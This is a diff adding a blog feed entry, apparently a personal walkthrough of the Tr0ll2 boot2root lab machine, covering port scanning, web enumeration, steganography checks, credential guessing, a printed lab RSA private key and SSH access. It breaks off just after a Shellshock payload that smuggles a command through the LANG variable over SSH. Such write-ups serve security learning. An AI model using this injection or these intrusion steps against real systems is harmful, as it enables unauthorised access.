@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[[<hilg>o</hilg>]\x[<hilg>c</hilg>]\x[<hilg>s</hilg>]\x[<hilg>i</hilg>]\x[<hilg>b</hilg>]\x[<hilg>a</hilg>]\x[<hilg>n</hilg>]]]></title>
+  <title><![CDATA[<hilg>o</hilg>x<hilg>c</hilg>x<hilg>s</hilg>x<hilg>i</hilg>x<hilg>b</hilg>x<hilg>a</hilg>x<hilg>n</hilg>]]></title>
   <link href="http://oxcxsxixbxaxn.github.io/atom.xml" rel="self"/>
   <link href="http://oxcxsxixbxaxn.github.io/"/>
-  <updated>2014-10-26T13:01:50+00:00</updated>
+  <updated>2014-10-27T21:08:28+00:00</updated>
   <id>http://oxcxsxixbxaxn.github.io/</id>
   <author>
     <name><![CDATA[oxcxsxixbxaxn]]></name>
@@ -12,5 +12,793 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[For Whom the Bell Tr0lls - Tr0ll2 Walthrough]]></title>
+    <link href="http://oxcxsxixbxaxn.github.io/blog/2014/10/27/for-whom-the-bell-tr0lls-tr0ll2-walthrough/"/>
+    <updated>2014-10-27T11:28:36+00:00</updated>
+    <id>http://oxcxsxixbxaxn.github.io/blog/2014/10/27/for-whom-the-bell-tr0lls-tr0ll2-walthrough</id>
+    <content type="html"><![CDATA[<p>My first full boot2root challenge and walkthrough.  I have been learning on the fly with some of the other challenges but for most part I&rsquo;d had to refer to walkthroughs, but this time I was determined to complete the journey under my own steam before any other walthroughs were published.</p>
+
+<h2>Poking about</h2>
+
+<p>Started the ball rolling with with some basic enumeration:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># netdiscover</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see what is listening with a simple scan&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># nmap -sS -A -O 192.168.6.128
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-26 13:46 GMT
+</span><span class='line'>Nmap scan report for 192.168.6.128
+</span><span class='line'>Host is up (0.0011s latency).
+</span><span class='line'>Not shown: 997 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>21/tcp open  ftp     vsftpd 2.0.8 or later
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
+</span><span class='line'>|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
+</span><span class='line'>|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
+</span><span class='line'>MAC Address: 00:0C:29:85:A9:28 (VMware)
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 2.6.X|3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 2.6.32 - 3.10
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   1.11 ms 192.168.6.128
+</span><span class='line'>
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 16.80 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Exploring the Web</h2>
+
+<p>Starting with the 80/tcp, after taking a look with a browser, used wget to grab the files&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># wget -pnH http://192.168.6.128
+</span><span class='line'>
+</span><span class='line'>Saving to: 'index.html'
+</span><span class='line'>Saving to: 'robots.txt'
+</span><span class='line'>Saving to: 'tr0ll_again.jpg'
+</span><span class='line'>Downloaded: 3 files, 76K in 0.004s (19.0 MB/s)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Along with the html and a jpg, also got a <code>robots.txt</code></p>
+
+<p>Looking at the image for stego hidden info&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># strings tr0ll_again.jpg</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nothing&hellip;</p>
+
+<p>Tried with a stego detection tool and found some additional bytes, but not looking significant sense right now, may come back to this&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># stepic -d -i tr0ll_again.jpg | xxd
+</span><span class='line'>
+</span><span class='line'>0000000: 9292 9292 9292 9292 9292 9292 9292 9292  ................
+</span><span class='line'>0000010: 9292 9292 9292 9290 5291 1292 8812 9292  ........R.......
+</span><span class='line'>0000020: 0992 9292 8052 9016 9292 924a 9152 0891  .....R.....J.R..
+</span><span class='line'>0000030: 9290 1292 9292 1281 b8ec 07b0            ............</span></code></pre></td></tr></table></div></figure>
+
+
+<p>on to <code>robots.txt</code>&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat robots.txt
+</span><span class='line'>
+</span><span class='line'>User-agent:*
+</span><span class='line'>Disallow:
+</span><span class='line'>/noob
+</span><span class='line'>/nope
+</span><span class='line'>/try_harder
+</span><span class='line'>/keep_trying
+</span><span class='line'>/isnt_this_annoying
+</span><span class='line'>/nothing_here
+</span><span class='line'>/404
+</span><span class='line'>/LOL_at_the_last_one
+</span><span class='line'>/trolling_is_fun
+</span><span class='line'>/zomg_is_this_it
+</span><span class='line'>/you_found_me
+</span><span class='line'>/I_know_this_sucks
+</span><span class='line'>/You_could_give_up
+</span><span class='line'>/dont_bother
+</span><span class='line'>/will_it_ever_end
+</span><span class='line'>/I_hope_you_scripted_this
+</span><span class='line'>/ok_this_is_it
+</span><span class='line'>/stop_whining
+</span><span class='line'>/why_are_you_still_looking
+</span><span class='line'>/just_quit
+</span><span class='line'>/seriously_stop</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I have since discovered that the same can be done with &ldquo;dirb&rdquo;, but using my rough and ready script found 4 of these dirs exist..</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>while read p; do echo $p; wget -pnH http\:\/\/192.168.6.128$p;echo; done &lt;robots.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Noticed each of these contained the same html and what looked like the same jpg image, but a closer check shows one of them is different.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># find ./ -iname '*.jpg' | xargs md5sum
+</span><span class='line'>
+</span><span class='line'>8e40e4bf4212b317788de52381072cd8  ./noob/cat_the_troll.jpg
+</span><span class='line'>f094e16de91dae231812a2fb382d8803  ./dont_bother/cat_the_troll.jpg
+</span><span class='line'>8e40e4bf4212b317788de52381072cd8  ./keep_trying/cat_the_troll.jpg
+</span><span class='line'>8e40e4bf4212b317788de52381072cd8  ./ok_this_is_it/cat_the_troll.jpg</span></code></pre></td></tr></table></div></figure>
+
+
+<p>No obvious stego and strings, except for the slightly larger one <code>dont_bother/cat_the_troll.jpg</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># stepic -di noob/cat_the_troll.jpg | xxd
+</span><span class='line'>0000000: 6e6d                                     nm
+</span><span class='line'>
+</span><span class='line'># stepic -di dont_bother/cat_the_troll.jpg | xxd
+</span><span class='line'>0000000: 6e6d                                     nm
+</span><span class='line'>
+</span><span class='line'># strings noob/cat_the_troll.jpg
+</span><span class='line'>
+</span><span class='line'># strings dont_bother/cat_the_troll.jpg
+</span><span class='line'>...trim...
+</span><span class='line'>Look Deep within y0ur_self for the answer</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Having seen this kind of troll before, quickly found the answer.txt</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># curl http://192.168.6.128/y0ur_self/
+</span><span class='line'>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'> &lt;head&gt;
+</span><span class='line'>  &lt;title&gt;Index of /y0ur_self&lt;/title&gt;
+</span><span class='line'> &lt;/head&gt;
+</span><span class='line'> &lt;body&gt;
+</span><span class='line'>&lt;h1&gt;Index of /y0ur_self&lt;/h1&gt;
+</span><span class='line'>&lt;table&gt;&lt;tr&gt;&lt;th&gt;&lt;img src="http://oxcxsxixbxaxn.github.io/icons/blank.gif" alt="[ICO]"&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=N;O=D"&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=M;O=A"&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=S;O=A"&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=D;O=A"&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+</span><span class='line'>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="http://oxcxsxixbxaxn.github.io/icons/back.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="http://oxcxsxixbxaxn.github.io/"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;
+</span><span class='line'>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="http://oxcxsxixbxaxn.github.io/icons/text.gif" alt="[TXT]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="answer.txt"&gt;answer.txt&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;04-Oct-2014 01:22  &lt;/td&gt;&lt;td align="right"&gt;1.3M&lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;
+</span><span class='line'>&lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+</span><span class='line'>&lt;/table&gt;
+</span><span class='line'>&lt;address&gt;Apache/2.2.22 (Ubuntu) Server at 192.168.6.128 Port 80&lt;/address&gt;
+</span><span class='line'>&lt;/body&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Appears to be a base64 encoded list which quickly decodes to some kind of dictionary list</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># base64 answer.txt &gt; dec-answer.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>&hellip;however a couple of these stood out on visual review&hellip;</p>
+
+<p><code>ItCantReallyBeThisEasyRightLOL</code></p>
+
+<p>&hellip;and down in amongst the Caps items&hellip;</p>
+
+<p><code>trollololol</code></p>
+
+<p>Tried the above 2 phrases on ssh and ftp in various combos but this is where progress halted, not even a troll to trip over&hellip;I was stuck&hellip;
+My thoughts kept coming back to a bruteforce/dictionary attack of some kind, but surely the user/password would be based on something given up by the server, from the words used in the web pages, service banners, image texts, etc. I decided to leave the decoded answer.txt out for now, except for the &ldquo;anomolous&rdquo; words I pulled out and eventually after much dodgy scripting, (I am keen to read other walkthroughs when published as I&rsquo;m sure there was an easier way to get to this, whether using a different tool or something simpler that I missed)</p>
+
+<p><code>Tr0ll/Tr0ll</code> came up trumps!!</p>
+
+<h2>Back In Action</h2>
+
+<p>After a couple of days of contemplating defeat, now finally back on track making progress again&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ftp 192.168.6.128
+</span><span class='line'>Connected to 192.168.6.128.
+</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+</span><span class='line'>Name (192.168.6.128:root): Tr0ll
+</span><span class='line'>331 Please specify the password.
+</span><span class='line'>Password:
+</span><span class='line'>230 Login successful.
+</span><span class='line'>Remote system type is UNIX.
+</span><span class='line'>Using binary mode to transfer files.
+</span><span class='line'>ftp&gt; ls
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
+</span><span class='line'>226 Directory send OK.
+</span><span class='line'>ftp&gt; get lmao.zip
+</span><span class='line'>local: lmao.zip remote: lmao.zip
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+</span><span class='line'>226 Transfer complete.
+</span><span class='line'>1474 bytes received in 0.01 secs (270.9 kB/s)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Obiviously password protected, and after 2 failed attempts was starting to wonder if the troll had me beaten again, but&hellip;
+third time lucky with the earlier dictionary list word <code>ItCantReallyBeThisEasyRightLOL</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># unzip lmao.zip
+</span><span class='line'>Archive:  lmao.zip
+</span><span class='line'>[lmao.zip] noob password:
+</span><span class='line'>password incorrect--reenter:
+</span><span class='line'>password incorrect--reenter:
+</span><span class='line'>replace noob? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
+</span><span class='line'>new name: noob.txt
+</span><span class='line'>  inflating: noob.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A private key, must be for ssh auth&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat noob.txt
+</span><span class='line'>
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+</span><span class='line'>yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+</span><span class='line'>/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+</span><span class='line'>q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+</span><span class='line'>z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+</span><span class='line'>e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+</span><span class='line'>u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+</span><span class='line'>gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+</span><span class='line'>UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+</span><span class='line'>La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+</span><span class='line'>xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+</span><span class='line'>aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+</span><span class='line'>K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+</span><span class='line'>n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+</span><span class='line'>TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+</span><span class='line'>WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+</span><span class='line'>ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+</span><span class='line'>0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+</span><span class='line'>vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+</span><span class='line'>ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+</span><span class='line'>th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+</span><span class='line'>G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+</span><span class='line'>q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+</span><span class='line'>vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+</span><span class='line'>zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flying now&hellip; erm, what? <code>TRY HARDER LOL!</code> I did LOL!!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ssh noob@192.168.6.128 -i noob.txt
+</span><span class='line'>TRY HARDER LOL!
+</span><span class='line'>Connection to 192.168.6.128 closed.
+</span><span class='line'>
+</span><span class='line'># ssh HARDER@192.168.6.128 -i noob.z
+</span><span class='line'>HARDER@192.168.6.128's password:
+</span><span class='line'>Permission denied, please try again.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Closer inspection with debugging confirms that it does actually successfully authenticate, but the connection dies immediatley&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ssh noob@192.168.6.128 -i noob.txt -v
+</span><span class='line'>OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013
+</span><span class='line'>debug1: Reading configuration data /etc/ssh/ssh_config
+</span><span class='line'>debug1: /etc/ssh/ssh_config line 19: Applying options for *
+</span><span class='line'>debug1: Connecting to 192.168.6.128 [192.168.6.128] port 22.
+</span><span class='line'>debug1: Connection established.
+</span><span class='line'>debug1: permanently_set_uid: 0/0
+</span><span class='line'>debug1: identity file noob.txt type -1
+</span><span class='line'>debug1: identity file noob.txt-cert type -1
+</span><span class='line'>debug1: Remote protocol version 2.0, remote software version OpenSSH_5.9p1 Debian-5ubuntu1.4
+</span><span class='line'>debug1: match: OpenSSH_5.9p1 Debian-5ubuntu1.4 pat OpenSSH_5*
+</span><span class='line'>debug1: Enabling compatibility mode for protocol 2.0
+</span><span class='line'>debug1: Local version string SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+</span><span class='line'>debug1: SSH2_MSG_KEXINIT sent
+</span><span class='line'>debug1: SSH2_MSG_KEXINIT received
+</span><span class='line'>debug1: kex: server-&gt;client aes128-ctr hmac-md5 none
+</span><span class='line'>debug1: kex: client-&gt;server aes128-ctr hmac-md5 none
+</span><span class='line'>debug1: sending SSH2_MSG_KEX_ECDH_INIT
+</span><span class='line'>debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+</span><span class='line'>debug1: Server host key: ECDSA 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96
+</span><span class='line'>debug1: Host '192.168.6.128' is known and matches the ECDSA host key.
+</span><span class='line'>debug1: Found key in /root/.ssh/known_hosts:5
+</span><span class='line'>debug1: ssh_ecdsa_verify: signature correct
+</span><span class='line'>debug1: SSH2_MSG_NEWKEYS sent
+</span><span class='line'>debug1: expecting SSH2_MSG_NEWKEYS
+</span><span class='line'>debug1: SSH2_MSG_NEWKEYS received
+</span><span class='line'>debug1: Roaming not allowed by server
+</span><span class='line'>debug1: SSH2_MSG_SERVICE_REQUEST sent
+</span><span class='line'>debug1: SSH2_MSG_SERVICE_ACCEPT received
+</span><span class='line'>debug1: Authentications that can continue: publickey,password
+</span><span class='line'>debug1: Next authentication method: publickey
+</span><span class='line'>debug1: Trying private key: noob.z
+</span><span class='line'>debug1: read PEM private key done: type RSA
+</span><span class='line'>debug1: Authentication succeeded (publickey).
+</span><span class='line'>Authenticated to 192.168.6.128 ([192.168.6.128]:22).
+</span><span class='line'>debug1: channel 0: new [client-session]
+</span><span class='line'>debug1: Requesting no-more-sessions@openssh.com
+</span><span class='line'>debug1: Entering interactive session.
+</span><span class='line'>debug1: Remote: Forced command.
+</span><span class='line'>debug1: Sending environment.
+</span><span class='line'>debug1: Sending env LANG = en_GB.UTF-8
+</span><span class='line'>TRY HARDER LOL!debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+</span><span class='line'>debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+</span><span class='line'>
+</span><span class='line'>debug1: channel 0: free: client-session, nchannels 1
+</span><span class='line'>Connection to 192.168.6.128 closed.
+</span><span class='line'>Transferred: sent 2632, received 1744 bytes, in 0.1 seconds
+</span><span class='line'>Bytes per second: sent 40829.1, received 27053.9
+</span><span class='line'>debug1: Exit status 0</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>SHELLSHOCK!! BASHBUG!!</h2>
+
+<p>During the initial days of shellshock a few weks back I was looking at all kinds of exploits and remembered the OpenSSL exploit and thinking at the time how it was next to useless given that you had to authenticate first, but in this case it seemed to fit the bill&hellip;</p>
+
+<p>First attempt didn&rsquo;t work out.. <code># LANG='() { :; }; /usr/bin/id' ssh noob@192.168.6.128 -i noob.txt</code>, next try did the trick tho..</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
